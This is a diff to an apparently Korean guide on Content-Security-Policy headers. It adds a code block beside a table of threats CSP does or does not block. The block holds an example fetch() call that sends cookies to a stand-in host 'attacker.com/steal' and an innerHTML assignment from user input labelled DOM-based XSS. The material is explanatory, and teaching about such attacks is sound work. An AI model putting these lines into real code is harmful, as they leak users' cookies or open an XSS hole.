@@ -190,6 +190,10 @@ Content-Security-Policy: default-src 'self';
 | **Clickjacking**  | ❌         | `X-Frame-Options` 필요  |
 | **데이터 유출 via JS** | ✅         | `connect-src` 제한으로 방지 |
 
+```
+fetch('https://attacker.com/steal', {body: cookies}); // 데이터 유출
+element.innerHTML = userInput;   // DOM-based XSS
+```
 
 <br>
 
